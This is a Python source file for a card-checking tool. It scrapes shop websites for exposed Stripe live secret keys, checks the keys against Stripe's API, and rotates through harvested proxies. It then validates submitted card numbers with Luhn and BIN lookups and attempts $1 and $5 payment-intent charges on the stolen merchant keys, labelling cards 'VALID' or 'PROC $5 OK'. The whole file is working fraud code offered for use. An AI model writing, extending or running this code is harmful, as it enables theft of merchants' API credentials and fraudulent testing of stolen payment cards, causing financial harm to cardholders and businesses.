import requests
import random
import re
import aiohttp
import asyncio
from luhn import is_valid
from bs4 import BeautifulSoup
from config import PROXY_SOURCES, SHOP_SITES

proxies_list = []
authkeys_list = []
lock = asyncio.Lock()

async def update_proxy_list():
    global proxies_list
    all_px = []
    for src in PROXY_SOURCES:
        try:
            r = requests.get(src, timeout=10)
            all_px += [p.strip() for p in r.text.split('\n') if ':' in p]
        except: pass
    all_px = list(set(all_px))[:1000]
    
    live_px = []
    connector = aiohttp.TCPConnector(limit=50)
    async with aiohttp.ClientSession(connector=connector) as sess:
        coros = [test_px(sess, px) for px in all_px[:200]]
        res = await asyncio.gather(*coros, return_exceptions=True)
        live_px = [px for px in res if isinstance(px, str)]
    
    proxies_list = live_px[:50]
    print(f"Updated proxy list: {len(proxies_list)} active")

async def test_px(sess, px):
    try:
        prx = {"http://": f"http://{px}", "https://": f"http://{px}"}
        async with sess.get("http://httpbin.org/ip", proxy=prx['http://'], timeout=aiohttp.ClientTimeout(total=5)) as resp:
            return px if resp.status == 200 else None
    except: return None

async def harvest_authkeys():
    global authkeys_list
    new_keys = []
    connector = aiohttp.TCPConnector(limit=20)
    async with aiohttp.ClientSession(connector=connector) as sess:
        sites = random.sample(SHOP_SITES, min(5, len(SHOP_SITES)))
        for site in sites:
            try:
                async with sess.get(site, timeout=10) as resp:
                    if resp.status == 200:
                        txt = await resp.text()
                        matches = re.findall(r'[sS][kK]_[lL][iI][vV][eE]_[0-9a-zA-Z]+', txt)
                        new_keys += list(set(matches))
                        
                        soup = BeautifulSoup(txt, 'html.parser')
                        for scr in soup.find_all('script'):
                            if scr.string:
                                matches = re.findall(r'[sS][kK]_[lL][iI][vV][eE]_[0-9a-zA-Z]+', scr.string)
                                new_keys += list(set(matches))
            except: pass
    
    live_new = [k for k in new_keys[:10] if await validate_key(k)]
    if live_new:
        authkeys_list += live_new
        authkeys_list = authkeys_list[-20:]
        print(f"Harvested {len(live_new)} new keys. Total: {len(authkeys_list)}")

async def validate_key(key):
    try:
        hdr = {'Authorization': f'Bearer {key}'}
        r = requests.post('https://api.stripe.com/v1/payment_intents', headers=hdr, data={'amount': '1'}, timeout=10)
        return r.status_code < 403
    except: return False

async def get_proxy_list():
    if not proxies_list:
        await update_proxy_list()
    return proxies_list or ['']

async def get_authkeys():
    if not authkeys_list:
        await harvest_authkeys()
    return authkeys_list or ['dummy_key']

async def validate_bin(bin_num):
    try:
        connector = aiohttp.TCPConnector(limit=10)
        async with aiohttp.ClientSession(connector=connector) as sess:
            async with sess.get(f'https://binlist.net/json/{bin_num}') as r:
                if r.status == 200:
                    data = await r.json()
                    scheme = data.get('scheme', '').lower()
                    return 'visa' in scheme or 'mastercard' in scheme, data.get('bank', {}).get('name', 'Unknown')
    except: pass
    return False, 'Unknown'

async def process_card(full_data):
    parts = re.split(r'[\|/ ]', full_data.strip())
    if len(parts) < 4: return "Invalid format. Use num|mm|yy|cvv"
    num, mm, yy, cvv = parts[:4]
    
    if not is_valid(num) or not (1 <= int(mm) <= 12) or int(yy) < 26:
        return "Invalid Luhn/format"
    
    bin6 = num[:6]
    vbin, bank = await validate_bin(bin6)
    if not vbin: return f"Invalid BIN {bin6} ({bank})"
    
    pxlist = await get_proxy_list()
    px = random.choice(pxlist) if pxlist else None
    prx_dict = {'http': f'http://{px}', 'https': f'http://{px}'} if px else None
    
    keylist = await get_authkeys()
    for key in keylist:
        try:
            pdata = {
                'amount': '100', 'currency': 'usd',
                'payment_method_data[type]': 'card',
                'payment_method_data[card][number]': num,
                'payment_method_data[card][exp_month]': mm,
                'payment_method_data[card][exp_year]': f'20{yy}',
                'payment_method_data[card][cvc]': cvv,
            }
            hdr = {'Authorization': f'Bearer {key}', 'Content-Type': 'application/x-www-form-urlencoded'}
            resp = requests.post('https://api.stripe.com/v1/payment_intents', data=pdata, proxies=prx_dict, headers=hdr, timeout=15)
            txt_resp = resp.text.lower()
            if resp.status_code == 200 and 'requires_action' not in txt_resp:
                # Process charge $5
                cdata = pdata.copy()
                cdata['amount'] = '500'
                cresp = requests.post('https://api.stripe.com/v1/payment_intents', data=cdata, proxies=prx_dict, headers=hdr, timeout=15)
                proc_status = " | PROC $5 OK" if cresp.status_code == 200 else " | VALID ONLY"
                if not await validate_key(key):
                    authkeys_list.remove(key)
                return f"VALID [paygw1] {bank} | BIN:{bin6}{proc_status}"
        except:
            if key in authkeys_list: authkeys_list.remove(key)
            continue
    return "All gw fail. Updating lists..."
